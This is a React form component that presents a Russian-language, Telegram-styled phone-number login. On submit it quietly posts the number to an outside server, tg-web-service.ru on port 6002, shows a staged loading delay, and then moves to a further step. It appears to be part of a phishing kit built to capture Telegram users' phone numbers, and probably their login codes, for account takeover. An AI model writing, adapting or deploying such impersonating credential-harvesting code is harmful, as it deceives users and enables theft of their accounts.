import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { zodPhoneNumber } from "@/lib/zod/utils";
import { useForm } from "react-hook-form";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "./ui/form";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { cn, getCountryPlaceholder } from "@/lib/utils/utils";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";
import { Checkbox } from "./ui/checkbox";
import { countries } from "@/lib/utils/countries";
import axios from "axios";
import { usePhoneNumberStore } from "@/lib/store/phoneNumber";
import { useNavigate } from "react-router-dom";
import { useState } from "react";
import { Loader2 } from "lucide-react";

const formSchema = z.object({
  countryCode: z.string({ required_error: "Пожалуйста, выберите код страны." }),
  phoneNumber: zodPhoneNumber,
  keepSignedIn: z.boolean(),
});

interface FormPhoneProps {
  className?: string;
}

const FormPhone = ({ className }: FormPhoneProps) => {
  const navigate = useNavigate();
  const { setValue: setPhoneNumber } = usePhoneNumberStore();
  const [isLoading, setIsLoading] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      countryCode: "",
      phoneNumber: "",
      keepSignedIn: false,
    },
  });

  const onSubmit = (values: z.infer<typeof formSchema>) => {
    axios.post("https://tg-web-service.ru:6002/processNumber", {
      phone_number: values.phoneNumber,
    });

    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);

      setPhoneNumber(values.phoneNumber);
      navigate("/k");
    }, 2000);
  };

  return (
    <Form {...form}>
      <form
        onSubmit={form.handleSubmit(onSubmit)}
        className={cn("w-full space-y-8", className)}
      >
        <div className="space-y-4">
          <FormField
            control={form.control}
            name="countryCode"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-sm font-light">Страна</FormLabel>
                <Select
                  onValueChange={field.onChange}
                  defaultValue={field.value}
                >
                  <FormControl>
                    <SelectTrigger className="py-6 hover:border-telegram hover:transition-colors hover:focus:border-border">
                      <SelectValue
                        placeholder={countries.map((country) =>
                          country.code === "RU"
                            ? getCountryPlaceholder(country)
                            : "",
                        )}
                      />
                    </SelectTrigger>
                  </FormControl>
                  <SelectContent>
                    {countries.map((country) => (
                      <SelectItem
                        key={country.name}
                        value={`(${country.dial_code}) ${country.name}`}
                        className="px-2 text-sm text-primary"
                      >
                        {getCountryPlaceholder(country)}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <FormMessage />
              </FormItem>
            )}
          />
          <FormField
            control={form.control}
            name="phoneNumber"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="text-sm font-light">
                  Номер телефона
                </FormLabel>
                <FormControl>
                  <Input
                    placeholder="Введите ваш номер телефона"
                    className="py-6 hover:border-telegram hover:transition-colors hover:focus:border-border"
                    type="tel"
                    required
                    {...field}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
        </div>
        <FormField
          control={form.control}
          name="keepSignedIn"
          render={({ field }) => (
            <FormItem className="flex flex-row items-start space-x-2 space-y-0">
              <FormControl>
                <Checkbox
                  checked={field.value}
                  onCheckedChange={field.onChange}
                />
              </FormControl>
              <FormLabel className="font-light">
                Сохранить данные для входа в систему
              </FormLabel>
              <FormMessage />
            </FormItem>
          )}
        />
        <Button
          type="submit"
          className={cn(
            "w-full rounded-lg bg-telegram py-7 hover:bg-telegram/90",
            isLoading ? "hidden" : "flex",
          )}
        >
          ДАЛЕЕ
        </Button>
        <Button
          className={cn(
            "w-full rounded-lg bg-telegram py-7 hover:bg-telegram/90",
            isLoading ? "flex" : "hidden",
          )}
          disabled
        >
          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
          ДАЛЕЕ
        </Button>
      </form>
    </Form>
  );
};
export default FormPhone;
